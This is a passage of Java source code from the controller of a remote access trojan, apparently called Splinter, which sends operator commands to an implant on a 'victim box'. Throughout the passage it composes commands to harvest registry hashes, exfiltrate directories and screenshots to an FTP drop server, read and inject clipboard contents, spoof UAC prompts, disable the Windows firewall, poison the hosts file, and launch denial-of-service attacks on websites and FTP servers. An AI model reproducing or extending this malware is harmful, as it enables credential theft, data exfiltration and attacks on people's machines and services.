					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.HARVEST_REGISTRY_HASHES + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;
					
				}
				/*****************************************************
				 * 
				 * 
				 * RUNNING PROCESS LIST
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.RUNNING_PROCESS_LIST))
				{										
					//user should only have to type "download ./fileName" //right now, only allow absolute file paths!
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.RUNNING_PROCESS_LIST;
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * PS for tasklist!!!
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("ps"))
				{										
					//ps is the linux version of tasklist, so just send tasklist
					cmdToSend = "tasklist";
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * PWD for echo %cd% 
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("pwd"))
				{										
					//ps is the linux version of tasklist, so just send tasklist
					cmdToSend = "echo %cd%";
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * ls for dir!!!
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().equalsIgnoreCase("ls"))
				{										
					//ls is the command for dir
					cmdToSend = "dir";
					
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * SPOOF_UAC
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.SPOOF_UAC.toLowerCase()))
				{										
					//Normalize command!
					String []arr = cmdToSend.split(",");
					if(arr.length != 3)
					{
						Driver.sop("spoof UAC is in invalid form. use [Spoofed Program Title], [Executable Name] next time.  e.g. " + Driver.SPOOF_UAC + ", Notepad, Notepad.exe" + ". I am sending Default Windows Update instead");
						
						
																																				//Default Prog Name		  //Program Executable
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SPOOF_UAC + Driver.delimeter_1 + "null" + Driver.delimeter_1 + "null";
					}
					else
					{
																																				//Default Prog Name			  //Program Executable
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.SPOOF_UAC + Driver.delimeter_1 + arr[1] + Driver.delimeter_1 + arr[2];
					}
					
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * BROWSE FILE SYSTEM
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.FILE_BROWSER_INITIATE))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.FILE_BROWSER_INITIATE;
				}
				
				/*****************************************************
				 * 
				 * 
				 * KILL COMMAND
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ddon))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ddon;
				}
				
				
				
				
				
				/*****************************************************
				 * 
				 * 
				 * DISABLE WINDOWS FIREWALL
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_WINDOWS_FIREWALL))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DISABLE_WINDOWS_FIREWALL;
				}
				
				/*****************************************************
				 * 
				 * 
				 * ENABLE WINDOWS FIREWALL
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_WINDOWS_FIREWALL))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ENABLE_WINDOWS_FIREWALL;
				}
				
				/*****************************************************
				 * 
				 * 
				 * DISPLAY WINDOWS FIREWALL
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISPLAY_WINDOWS_FIREWALL))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DISPLAY_WINDOWS_FIREWALL;
				}
				
				/*****************************************************
				 * 
				 * 
				 * EXTRACT CLIPBOARD
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.EXTRACT_CLIPBOARD))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.EXTRACT_CLIPBOARD;
				}
				
				/*****************************************************
				 * 
				 * 
				 * INJECT CLIPBOARD
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.INJECT_CLIPBOARD))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.INJECT_CLIPBOARD + Driver.delimeter_1 + " " + Drivers.jop_Query("Enter String to Inject into Clipboard: ", "Inject Into Clipboard");
				}
				
				
				
				
				/*****************************************************
				 * 
				 * 
				 * ORBITER PAYLOAD
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.ORBIT_DIRECTORY.toLowerCase()))
				{										
					//split the command accordingly
					//INITIAL FORMAT: ORBIT_DIRECTORY, [full path], [file type], [recursive directory extraction ==> true|false], timing interval in millis
					String [] arrOrbitEntries = cmdToSend.split(",");
					
					if(arrOrbitEntries == null || arrOrbitEntries.length != 5)
					{
						Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
						return true;
					}
					
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					int delay_secs = 1000;
					try
					{
						delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
					}catch(Exception ff)
					{						
						Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
						return true;
					}
															
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ORBIT_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + delay_secs + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * DATA EXFILTRATION PAYLOAD
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_ALERTER_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_EXTRACTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_INJECTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_INSPECTOR_PAYLOAD.toLowerCase()) || cmdToSend.trim().toLowerCase().startsWith(Driver.DATA_EXFIL_SELECTOR_PAYLOAD.toLowerCase())) )
				{										
					//split the command accordingly
					//INITIAL FORMAT: ORBIT_DIRECTORY, [full path], [file type], [recursive directory extraction ==> true|false], timing interval in millis
					String [] arrOrbitEntries = cmdToSend.split(",");
					
					if(arrOrbitEntries == null || arrOrbitEntries.length != 5)
					{
						Drivers.jop("Invalid parameters for Orbiter Payload. Unable to Continue!");
						return true;
					}
					
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					int delay_secs = 1000;
					try
					{
						delay_secs = 1000 * Integer.parseInt(arrOrbitEntries[4].trim());
					}catch(Exception ff)
					{						
						Drivers.jop("Invalid parameters for Orbiter Payload Delay interval. Unable to Continue!");
						return true;
					}
															
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.ORBIT_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + delay_secs + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * STOP DIRECTORY ORBIT
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && (cmdToSend.trim().toLowerCase().startsWith("halt orbiter payload") || cmdToSend.trim().toLowerCase().startsWith("stop orbit directory") || cmdToSend.trim().equalsIgnoreCase(Driver.STOP_ORBIT_DIRECTORY)))
				{										
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.STOP_ORBIT_DIRECTORY;					
				}
				
				/*****************************************************
				 * 
				 * 
				 * SET WALL PAPER
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.SET_WALLPAPER.toLowerCase()))
				{										
					String path = cmdToSend.replace(Driver.SET_WALLPAPER, "");
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
				}
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("set wallpaper"))
				{										
					String path = cmdToSend.replace("set wallpaper", "");
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
				}
				
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith("change wallpaper"))
				{										
					String path = cmdToSend.replace("change wallpaper", "");
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SET_WALLPAPER + Driver.delimeter_1 + " " + path.trim();					
				}
				
				/*****************************************************
				 * 
				 * 
				 * EXFIL DIRECTORY
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().toLowerCase().startsWith(Driver.EXFIL_DIRECTORY.toLowerCase()))
				{										
					//split the command accordingly
					//INITIAL FORMAT: EXFIL_DIRECTORY, [full path], [file type], [recursive directory extraction ==> true|false]
					String [] arrOrbitEntries = cmdToSend.split(",");
					
					if(arrOrbitEntries == null || arrOrbitEntries.length != 4)
					{
						Drivers.jop("Invalid parameters for Data Extraction Payload. Unable to Continue!");
						return true;
					}
					
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
							
															
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.EXFIL_DIRECTORY + Driver.delimeter_1 + arrOrbitEntries[1] + Driver.delimeter_1 + arrOrbitEntries[2] + Driver.delimeter_1 + arrOrbitEntries[3] + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;;					
				}
				
				/*****************************************************
				 * 
				 * 
				 * ENABLE CLIPBOARD EXTRACTOR
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_EXTRACTOR))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ENABLE_CLIPBOARD_EXTRACTOR;
				}
				
				/*****************************************************
				 * 
				 * 
				 * ENABLE CLIPBOARD INJECTOR
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.ENABLE_CLIPBOARD_INJECTOR))
				{
					//QUERY USER FOR INJECTION TEXT
					String injectionText = Drivers.jop_Query("Please Supply Injection Text: ", "Enter Injection Text");
					
					if(injectionText == null)
						return true;
					
					injectionText = injectionText.trim();
					
					//Query user if they would like a selective injection
					int selection = Drivers.jop_Confirm("Would you like to only inject text into clipboard if word match is first found?\n\nNOTE: Whitespaces are omitted as search parameters", "Absolute Clipboard Injection or Selective Injection?");
					
					String selectionText_For_Replace_Injection = " ";//just a blank space, if whitespace is sent to implant, we'll ignore and do a blanket injection
					
					if(selection == JOptionPane.YES_OPTION)
					{
						selectionText_For_Replace_Injection = Drivers.jop_Query("Please specify character sequence to be replaced with injection clipboard text if detected on remote machine: ", "Enter Character Sequence for Injection Text");
						
						if(selectionText_For_Replace_Injection == null || selectionText_For_Replace_Injection.trim().equals(""))
						{
							selectionText_For_Replace_Injection = "";
						}
						
						else 
						{
							selectionText_For_Replace_Injection = selectionText_For_Replace_Injection.trim();
						}
					}
					
					
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.ENABLE_CLIPBOARD_INJECTOR + Driver.delimeter_1 + injectionText + " " + Driver.delimeter_1 + selectionText_For_Replace_Injection.trim() + " ";
				}
				
				/*****************************************************
				 * 
				 * 
				 * DISABLE CLIPBOARD INJECTOR
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_INJECTOR))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_CLIPBOARD_INJECTOR;
				}
				
				/*****************************************************
				 * 
				 * 
				 * DISABLE CLIPBOARD EXTRACTOR
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_CLIPBOARD_EXTRACTOR))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_CLIPBOARD_EXTRACTOR;
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * SCRAPE SCREEN!
				 * 
				 * 
				 *****************************************************/
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.SCRAPE_SCREEN))
				{		
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					//otherwise, we know the server socket is running, ensure we are configured to receive files
					configureEnvironmentForScreenScrape(Driver.SCREEN_CAPTURE_DIRECTORY_NAME);
					
					//send the command
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.SCRAPE_SCREEN + Driver.delimeter_1 + this.myTempPath + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;//to delete when done
					
					//Create the Worker Thread for the Renderer Subroutine
					if(worker_ScreenScrape != null)
					{
						try	
						{	
							worker_ScreenScrape.killThisThread = true;  
							
							if(worker_ScreenScrape.screenRecord != null)
							{
								//worker_ScreenScrape.screenRecord
								worker_ScreenScrape.screenRecord.dispose();
							}
						}catch(Exception e){Driver.sop("Exception handled attempting to dispose previous screen renderer worker thread");}
					}
					
					worker_ScreenScrape = new Worker_Thread_Payloads(200, null,Worker_Thread_Payloads.PAYLOAD_RENDER_SCREEN, null, "", 1, this.fleMyScreenScrapeDirectory, null);
					worker_ScreenScrape.myTerminal = this;
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * DISABLE RECORD SCREEN
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DISABLE_RECORD_SCREEN))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DISABLE_RECORD_SCREEN;
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * GRAB HOST FILE
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.GRAB_HOST_FILE))
				{
					if(!FTP_ServerSocket.FTP_ServerSocket_Is_Open)
					{
						Driver.jop("ERROR!!! it doesn't appear that the FTP Server is running");
						return true;
					}
					
					else
					{
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.GRAB_HOST_FILE  + Driver.delimeter_1 + FTP_ServerSocket.FTP_Server_Address + Driver.delimeter_1 + FTP_ServerSocket.PORT;												
					}
					
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * APPEND TO HOST FILE
				 * 
				 * 
				 *****************************************************/				
				if(cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.APPEND_HOST_FILE) || cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.APPEND_TO_HOST_FILE) /*|| cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.POISON_HOST_DNS) || cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.POISON_DNS)*/) 
				{
					try
					{
						//append host file, 192.168.0.1, www.facebook.com, #facebook comment
						String [] command = cmdToSend.split(",");
						
						Drivers.jop_Warning("Note: This command must be run with administrator privileges on victim box", "Admin Privileges Required");
						
						//cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.APPEND_HOST_FILE  + Driver.delimeter_1 + command[1].trim() + Driver.delimeter_1 + command[2].trim() + Driver.delimeter_1 + command[3].trim();												
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.APPEND_HOST_FILE  + Driver.delimeter_1 + command[1].trim() + Driver.delimeter_1 + command[2].trim();
						
					}
					catch(Exception e)
					{											
						Drivers.jop_Error("Invalid paramaters specified for append to host file!", "Unable to complete selected action");
						return true;
					}
					
				}
				
				/*****************************************************
				 * 
				 * 
				 * WEBSITE DOS
				 * 
				 * 
				 *****************************************************/
				
				if(cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.DOS_WEBSITE))
				{
					//SPLIT THE COMMAND
					String [] arrCmd = cmdToSend.split(",");
					
					
					if(arrCmd.length == 2)
					{
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DOS_WEBSITE + Driver.delimeter_1 + arrCmd[1].trim() + Driver.delimeter_1 + "80";
					}
					
					else
					{
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DOS_WEBSITE + Driver.delimeter_1 + arrCmd[1].trim() + Driver.delimeter_1 + Integer.parseInt(arrCmd[2].trim());
					}
					
					//ensure user did not type : to indicate port, if so, change it
					String prevCmd = cmdToSend;
					try
					{
						 if(arrCmd[1].trim().contains(":"))
						 {
							 String []arrSplit = arrCmd[1].split(":");
							 cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DOS_WEBSITE + Driver.delimeter_1 + arrSplit[0].trim() + Driver.delimeter_1 + Integer.parseInt(arrSplit[1].trim());
						 }
						
					}
					catch(Exception e)
					{
						//not sure why error occurred, but if so, send the previous string
						cmdToSend = prevCmd;
					}
					
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * HALT WEBSITE DOS
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DOS_WEBSITE_HALT))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DOS_WEBSITE_HALT;
				}
				
				/*****************************************************
				 * 
				 * 
				 * FORWARD CONNECTION TO CONTROLLER
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.CONNECT_TO))
				{
					String parameters = cmdToSend.toLowerCase().replaceAll(Driver.CONNECT_TO.toLowerCase(), "");
					
					String address = null;
					int port = 0;
					boolean enableBeaconingUponDisconnection = false;
					boolean reconnectImmediatelyUponDisconnection = false;
					int beaconIntvl_millis = 1;
					
					
					
					String [] arrParams =  parameters.trim().split(" ");

					try
					{
						//
						// connect to 192.168.0.1:80 [optional commands]
						//
						if(arrParams[0].trim().contains(":"))
						{
							String [] arrSplit = arrParams[0].split(":");
							address = arrSplit[0].trim();
							port  = Integer.parseInt(arrSplit[1].trim());
							
							//check if optional commands are present
							if(arrParams.length > 1)
							{
								enableBeaconingUponDisconnection = Boolean.parseBoolean(arrParams[1].trim());
								reconnectImmediatelyUponDisconnection = Boolean.parseBoolean(arrParams[2].trim());
								beaconIntvl_millis = Integer.parseInt(arrParams[3].trim());
							}
						}
						
						//
						// connect to 192.168.0.1 80 [enable beaconing upon disconnection] [reconnect immediately if disconnected] [reconnection interval]
						//
						else
						{
							address = arrParams[0].trim();
							port  = Integer.parseInt(arrParams[1].trim());
							
							//check if optional commands are present
							if(arrParams.length > 2)
							{
								enableBeaconingUponDisconnection = Boolean.parseBoolean(arrParams[2].trim());
								reconnectImmediatelyUponDisconnection = Boolean.parseBoolean(arrParams[3].trim());
								beaconIntvl_millis = Integer.parseInt(arrParams[4].trim()) * 1000;
							}
						}
						
					}
					
					catch(Exception e)
					{
						//check if we have an address and port at least
						if(address != null && port > 0)
						{
							Drivers.appendCommandTerminalStatusMessage("Invalid format specified for \"CONNECT TO\" command. Defaulting to connect to " + address + " : " + port);
							cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.CONNECT_TO + Driver.delimeter_1 +  address.trim() + Driver.delimeter_1 + port + Driver.delimeter_1 + "false" + Driver.delimeter_1 + "false" + Driver.delimeter_1 + "1";
						}
						
						else//unknown command
						{
							Drivers.appendCommandTerminalStatusMessage("Invalid format specified for forward CONNECT TO command. Command NOT SENT!!!");							
							return true;
						}
					}
					
					//
					//COMPOSE COMMAND
					//
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.CONNECT_TO + Driver.delimeter_1 +  address.trim() + Driver.delimeter_1 + port + Driver.delimeter_1 + enableBeaconingUponDisconnection + Driver.delimeter_1 + reconnectImmediatelyUponDisconnection + Driver.delimeter_1 + beaconIntvl_millis;
					
					
				}
				
				
				
				
				/*****************************************************
				 * 
				 * 
				 * FTP Server DOS
				 * 
				 * 
				 *****************************************************/
				
				if(cmdToSend != null && cmdToSend.trim().toUpperCase().startsWith(Driver.DOS_FTP_SERVER))
				{
					//SPLIT THE COMMAND
					String [] arrCmd = cmdToSend.split(",");
					
					
					if(arrCmd.length >= 7)
					{
						String victimNet = arrCmd[1];
						String victimCtrlPrt = ""+Integer.parseInt(arrCmd[2].trim());
						String victimDataPrt = ""+Integer.parseInt(arrCmd[3].trim());
						String userNme = arrCmd[4].trim();
						String pass = arrCmd[5].trim();
						//remove superfluous quotation marks now
						pass = pass.replace("\"", "");
						
						//Create Command Listing
						String cmdList =  arrCmd[6].trim();
						
						//check if optional additional commands are provided
						if(arrCmd.length > 7)
						{
							//then all additional parameters will be treated as the commands to execute
							for(int i = 7; i < arrCmd.length; i++)
							{
								try
								{
									cmdList = cmdList + " " + Driver.delimeter_2 + arrCmd[i].trim();
								}
								catch(Exception ee)
								{
									continue;
								}
							}
							 
						}
						
						//
						//COMPOSE COMMAND
						//
						cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.DOS_FTP_SERVER + Driver.delimeter_1 +  victimNet.trim() + " " + Driver.delimeter_1 + victimCtrlPrt.trim() + " " + Driver.delimeter_1 + victimDataPrt.trim() + " " + Driver.delimeter_1 + userNme.trim() + " " + Driver.delimeter_1 + pass.trim() + " " + Driver.delimeter_1 + cmdList.trim() + " ";														
								
					}
					else
					{
						Drivers.jop_Error("Invalid Parameters specified for FTP Server DOS command", "Unable to Execute Specified Action");
						return false;
					}
				}
				
				
				/*****************************************************
				 * 
				 * 
				 * HALT FTP Server DOS
				 * 
				 * 
				 *****************************************************/
				
				else if(cmdToSend != null && cmdToSend.trim().equalsIgnoreCase(Driver.DOS_FTP_SERVER_HALT))
				{
					cmdToSend = Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 +Driver.DOS_FTP_SERVER_HALT;
				}
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
			}catch(Exception e){Drivers.jop_Error("Invalid value entered from shortcut command. \n\nUnable to Send Command " + " Code: " + e.getLocalizedMessage(), "Unable to Send Shortcut"); return false;}
			
			
			
			
			
			/*****************************************
			 * 
			 * 
			 * 
			 * 
			 * SEND THE COMMAND!
			 * 
			 * 
			 * 
			 * 
			 ******************************************/
			
			
			this.pwOut.println(cmdToSend);
			this.pwOut.flush();
			
			try	{	Driver.logReceivedLine(false, this.getId(), " " + this.myRandomIdentifier + " ", " SPLINTER - CONTROLER ", " " + myImplantName + " ", " " + Thread_ServerSocket.ControllerIP + " ", " " + this.myVictim_RHOST_IP + " ", cmdToSend);	} catch(Exception ee){}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("Thread ID: " + myThread_ID + " sendCommand_RAW", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	/**
	 * Create the main directory under the FTP top folder, and then create the folder based on what was specified in FolderName parameter 
	 * 
	 * @param FolderName
	 * @return
	 */
	public File configureEnvironmentForScreenScrape(String FolderName)
	{
		try
		{
			if(Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory())
			{
				Driver.jop("FTP Dropbox Improperly Configured!!!");
				return null;
			}
			
			//set up the screen capture folder now so that our rendere will work immediately
			
			//
			//Create Save Top Directory
			//
			
			/*if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
				this.fleMySaveDirectory = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + Driver.FTP_ServerSocket.FTP_Server_Address + "_" + Driver.FTP_ServerSocket.PORT);
			else
				this.fleMySaveDirectory = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + Driver.fileSeperator + Driver.FTP_ServerSocket.FTP_Server_Address + "_" + Driver.FTP_ServerSocket.PORT);
			*/
			
			if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
				this.fleMySaveDirectory = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + this.myVictim_RHOST_IP + "_" + Driver.FTP_ServerSocket.PORT);
			else
				this.fleMySaveDirectory = new File(Driver.fleFTP_FileHiveDirectory.getCanonicalPath() + Driver.fileSeperator + myVictim_RHOST_IP + "_" + Driver.FTP_ServerSocket.PORT);
			
			
			//create the directory
			
			//test if the directory already exists
			boolean directoryExists = true;
			if(!this.fleMySaveDirectory.exists() || !this.fleMySaveDirectory.isDirectory())
			{
				//attempt to create the directory
				directoryExists = this.fleMySaveDirectory.mkdir();
			}
			
			if(!directoryExists)
			{
				Driver.sop("Could not create directory!!! in " + this.strMyClassName);
				return null;
			}
			
			//
			//Create Screen Scrape Directory
			//
			if(Driver.fleFTP_FileHiveDirectory.getCanonicalPath().endsWith(Driver.fileSeperator))
				this.fleMyScreenScrapeDirectory = new File(this.fleMySaveDirectory.getCanonicalPath() + FolderName);
			else
				this.fleMyScreenScrapeDirectory = new File(this.fleMySaveDirectory.getCanonicalPath() + Driver.fileSeperator + FolderName);
			
			//Create the Directory
			if(!this.fleMyScreenScrapeDirectory.exists() || !this.fleMyScreenScrapeDirectory.isDirectory())
			{
				//attempt to create the directory
				directoryExists = this.fleMyScreenScrapeDirectory.mkdir();
			}
			
			return fleMyScreenScrapeDirectory;
		}
		catch(Exception e)
		{
			Driver.eop("configureEnvironmentForScreenScrape", strMyClassName, e, "", false);
		}
		
		return null;
	}
	
	public boolean closeThread()
	{
		try
		{
			//out of while loop, clean and close!
			continueRun = false;
			I_am_Disconnected_From_Implant = true;
			this.killThread = true;
			
			myDisconnectionTime = Drivers.getTimeStamp_Without_Date();
			if(myDisconnectionTime == null)
			{
				myDisconnectionTime = "";
			}
			
			//clean the frames if they are indicating a private message!
			try
			{
				for(int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
				{
					this.alJtxtpne_PrivatePanes.get(i).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
				}
				
			}catch(Exception e){}
			
			try{this.tmrReadLine.stop();}catch(Exception e){}
			
			if(this.i_am_Beacon_Agent)
			{
				updateBeaconConnectionTime(this.myReceivedConfirmationID_From_Implant);
			}
			
			//remove myself from arraylist		
			Drivers.removeThread(this, this.getId());		
		}
		catch(Exception e)
		{
			
		}
		
		return false;
	}
	
	public String reformatShortcut_ESTABLISH_PERSISTEN_LISTENER(String originalCommand, int port, String listenerBinaryFileName)
	{
		String strToReturn = "";
		
		try
		{
			//we basically reformat the command to match how the implant connected to this thread is to execute the command
			//by default, we assume the implant to start the listener is in the same launch directory as the currently running agent
			//we also assume we're running on a windows machine
